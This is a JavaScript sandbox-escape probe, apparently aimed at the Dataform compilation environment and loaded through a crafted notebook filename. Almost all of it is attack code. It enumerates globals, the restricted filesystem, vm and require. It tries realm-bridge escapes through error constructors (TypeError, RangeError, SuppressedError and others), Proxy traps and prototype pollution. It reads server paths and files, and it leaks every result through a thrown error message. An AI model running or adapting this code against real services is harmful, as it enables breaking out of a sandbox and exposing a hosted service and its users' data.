// FULL SANDBOX ENUMERATION — probe every accessible primitive in bundle realm.
// Loaded via notebook filename → nativeRequire() to bypass any V8 bridge dep.

var out = {};
function safe(k, fn) {
  try {
    var v = fn();
    out[k] = (typeof v === 'string' ? v : JSON.stringify(v)).substring(0, 800);
  } catch(e) {
    out[k] = 'ERR:' + (e && e.message ? e.message : String(e)).substring(0, 250);
  }
}

// ============ TIER A: GlobalThis full enumeration including jscomp internals ============
safe('globalThis_all', function() {
  var keys = Object.getOwnPropertyNames(globalThis).sort();
  return keys.join(',').substring(0, 2000);
});
safe('global_jscomp_keys', function() { return Object.keys($jscomp).sort().join(','); });
safe('global_jscomp_proto', function() { return Object.getOwnPropertyNames(Object.getPrototypeOf($jscomp) || {}).join(','); });
safe('global_jscomp_str', function() { return String($jscomp).substring(0, 400); });

// Walk classes$jscomp$inline_* — these are webpack internal classes
safe('class_inline_1_keys', function() { return Object.getOwnPropertyNames(globalThis.classes$jscomp$inline_1 || {}).join(','); });
safe('class_inline_2_keys', function() { return Object.getOwnPropertyNames(globalThis.classes$jscomp$inline_2 || {}).join(','); });
safe('class_inline_3_keys', function() { return Object.getOwnPropertyNames(globalThis.classes$jscomp$inline_3 || {}).join(','); });
safe('class_inline_6_keys', function() { return Object.getOwnPropertyNames(globalThis.classes$jscomp$inline_6 || {}).join(','); });
safe('class_inline_1_str', function() { return String(globalThis.classes$jscomp$inline_1).substring(0, 500); });
safe('class_inline_2_str', function() { return String(globalThis.classes$jscomp$inline_2).substring(0, 500); });

// JSCompiler_inline_result$jscomp$* — webpack inline results
safe('jscomp_inline_result_0', function() { return JSON.stringify(globalThis.JSCompiler_inline_result$jscomp$0 || 'none').substring(0,400); });
safe('jscomp_inline_result_2', function() { return JSON.stringify(globalThis.JSCompiler_inline_result$jscomp$2 || 'none').substring(0,400); });
safe('jscomp_inline_result_3', function() { return JSON.stringify(globalThis.JSCompiler_inline_result$jscomp$3 || 'none').substring(0,400); });

// ============ TIER B: restricted_fs FULL surface ============
safe('rfs_keys', function() { return Object.getOwnPropertyNames(restricted_fs).sort().join(','); });
safe('rfs_proto_keys', function() { return Object.getOwnPropertyNames(Object.getPrototypeOf(restricted_fs)).sort().join(','); });
safe('rfs_writeFile_exists', function() { return typeof restricted_fs.writeFile; });
safe('rfs_readlink_exists', function() { return typeof restricted_fs.readlink; });
safe('rfs_stat_exists', function() { return typeof restricted_fs.stat; });
safe('rfs_realpath_exists', function() { return typeof restricted_fs.realpath; });
safe('rfs_mkdir_exists', function() { return typeof restricted_fs.mkdir; });
safe('rfs_unlink_exists', function() { return typeof restricted_fs.unlink; });
safe('rfs_readdir_exists', function() { return typeof restricted_fs.readdir; });
// Inspect each function
safe('rfs_readFile_src', function() { return String(restricted_fs.readFile).substring(0, 600); });
safe('rfs_exists_src', function() { return String(restricted_fs.exists).substring(0, 600); });
safe('rfs_isDirectory_src', function() { return String(restricted_fs.isDirectory).substring(0, 600); });

// ============ TIER C: bundled vm full surface ============
safe('vm_keys', function() { return Object.getOwnPropertyNames(vm).sort().join(','); });
safe('vm_proto_keys', function() { return Object.getOwnPropertyNames(Object.getPrototypeOf(vm)).sort().join(','); });
safe('vm_runInNewContext_exists', function() { return typeof vm.runInNewContext; });
safe('vm_Script_exists', function() { return typeof vm.Script; });
safe('vm_createContext_exists', function() { return typeof vm.createContext; });
safe('vm_compileFunction_exists', function() { return typeof vm.compileFunction; });
safe('vm_compileModule_src', function() { return String(vm.compileModule).substring(0, 500); });
// vm.compileModule looks like it accepts source code — let's try calling it
safe('vm_compileModule_simple', function() {
  try {
    var m = vm.compileModule('return 42');
    return 'GOT module: ' + typeof m;
  } catch(e) { return 'compile_err:' + e.message; }
});
safe('vm_compileModule_process', function() {
  try {
    var m = vm.compileModule('return typeof process');
    return 'GOT module: ' + typeof m + ' = ' + String(m).substring(0,200);
  } catch(e) { return 'err:' + e.message; }
});

// ============ TIER D: bundled require surface ============
safe('require_keys', function() { return Object.getOwnPropertyNames(require).sort().join(','); });
safe('require_resolve_exists', function() { return typeof require.resolve; });
safe('require_cache_exists', function() { return typeof require.cache + ',keys=' + (require.cache ? Object.keys(require.cache).length : 'none'); });
safe('require_extensions_exists', function() { return typeof require.extensions; });
safe('require_main_exists', function() { return typeof require.main; });
safe('require_resolve_path', function() {
  try { return require.resolve('path'); } catch(e) { return 'err:' + e.message; }
});

// ============ TIER E: modern V8 escape primitives ============
// SuppressedError (ES2023) — vm2 CVE-2026-26332 family
safe('SuppressedError_exists', function() { return typeof SuppressedError; });
safe('AggregateError_exists', function() { return typeof AggregateError; });
safe('SuppressedError_bridge', function() {
  try {
    var s = new SuppressedError(new Error('inner'), new Error('outer'), 'msg');
    var F = s.constructor.constructor;
    return F('return typeof process')();
  } catch(e) { return 'err:' + e.message; }
});
safe('AggregateError_bridge', function() {
  try {
    var ag = new AggregateError([new Error('a')], 'msg');
    var F = ag.errors[0].constructor.constructor;
    return F('return typeof process')();
  } catch(e) { return 'err:' + e.message; }
});

// Async function constructor — different from Function
safe('AsyncFunction', function() {
  var AsyncF = (async function() {}).constructor;
  return typeof AsyncF + ' src:' + String(AsyncF).substring(0,200);
});
safe('AsyncFunction_call', function() {
  var AsyncF = (async function() {}).constructor;
  var fn = AsyncF('return typeof process');
  return 'made async fn, type=' + typeof fn;
});

// Generator function constructor
safe('GeneratorFunction', function() {
  var GenF = (function*() {}).constructor;
  return typeof GenF + ' src:' + String(GenF).substring(0,200);
});

// ============ TIER F: _DF_SESSION methods that might bridge realms ============
safe('session_compile_src', function() {
  return String(global._DF_SESSION.compile).substring(0, 800);
});
safe('session_compileToBase64_src', function() {
  return String(global._DF_SESSION.compileToBase64).substring(0, 800);
});
safe('session_compileError_src', function() {
  return String(global._DF_SESSION.compileError).substring(0, 800);
});
// What does compileError return? If user-controllable, we control error response
safe('session_compileError_call', function() {
  try {
    return String(global._DF_SESSION.compileError(new Error('test'), 'definitions/x.sqlx'));
  } catch(e) { return 'err:' + e.message; }
});

// ============ TIER G: Reflect / Proxy primitives ============
safe('Reflect_keys', function() { return Object.getOwnPropertyNames(Reflect).sort().join(','); });
safe('Proxy_exists', function() { return typeof Proxy; });

// Proxy trap that triggers when bundled code accesses our object
safe('proxy_get_trap', function() {
  var p = new Proxy({}, {
    get: function(target, prop) {
      try {
        // Inside trap, can we access caller's stack?
        var e = new Error('trap');
        return e.constructor.constructor('return typeof process')();
      } catch(e) { return 'trap_err:' + e.message; }
    }
  });
  return 'proxy made, access x: ' + p.x;
});

// ============ TIER H: Native function detection ============
safe('find_native_functions', function() {
  var found = [];
  function walk(obj, path, depth) {
    if (depth > 2) return;
    if (!obj || typeof obj !== 'object' && typeof obj !== 'function') return;
    try {
      var keys = Object.getOwnPropertyNames(obj);
      for (var i = 0; i < keys.length && found.length < 30; i++) {
        var k = keys[i];
        try {
          var v = obj[k];
          if (typeof v === 'function') {
            var src = String(v);
            if (src.indexOf('[native code]') >= 0) {
              found.push(path + '.' + k);
            }
          }
        } catch(e) {}
      }
    } catch(e) {}
  }
  walk(globalThis, 'g', 0);
  walk(restricted_fs, 'rfs', 0);
  walk(global._DF_SESSION, 'sess', 0);
  walk(vm, 'vm', 0);
  walk(require, 'req', 0);
  return found.join(',');
});

// ============ TIER I: Prototype pollution effects ============
// Modify Array.prototype.push — does Dataform use it internally?
safe('array_push_polluted', function() {
  var orig = Array.prototype.push;
  var hit = [];
  Array.prototype.push = function() {
    try { hit.push(String(new Error().stack).substring(0,200)); } catch(e) {}
    return orig.apply(this, arguments);
  };
  // restore promptly to avoid breaking subsequent ops
  setTimeout(function() { Array.prototype.push = orig; }, 0);
  return 'polluted, hits: ' + hit.length;
});

// ============ TIER J: bundle realm Function vs sandbox realm ============
// The realm-bridge primitive we already know works
safe('classic_bridge_via_TypeError', function() {
  function herr() { try { null.x; } catch(e) { return e; } }
  var F = herr().constructor.constructor;
  return F('return typeof process + "|" + typeof Buffer + "|" + typeof require + "|" + typeof __dirname')();
});

// What if we bridge through error from VARIOUS native operations
safe('bridge_RangeError', function() {
  function herr() { try { (new Array(-1)); } catch(e) { return e; } }
  var F = herr().constructor.constructor;
  return F('return typeof process')();
});
safe('bridge_ReferenceError', function() {
  function herr() { try { undefinedVarXYZ; } catch(e) { return e; } }
  var F = herr().constructor.constructor;
  return F('return typeof process')();
});
safe('bridge_URIError', function() {
  function herr() { try { decodeURIComponent('%'); } catch(e) { return e; } }
  var F = herr().constructor.constructor;
  return F('return typeof process')();
});

// ============ TIER K: __dirname / __filename leak server-side paths ============
safe('dirname_val', function() { return __dirname; });
safe('filename_val', function() { return __filename; });

// Try reading paths near __dirname via restricted_fs
safe('rfs_dirname', function() {
  try { return restricted_fs.readFile(__dirname + '/package.json').toString().substring(0, 500); } catch(e) { return 'err:' + e.message; }
});
safe('rfs_dirname_index', function() {
  try { return restricted_fs.readFile('index.js').toString().substring(0, 500); } catch(e) { return 'err:' + e.message; }
});

// ============ Provide notebook shape ============
module.exports.asJson = { cells: [], metadata: {}, nbformat: 4, nbformat_minor: 5 };

throw new Error('FULL_SANDBOX_PROBE:' + JSON.stringify(out));
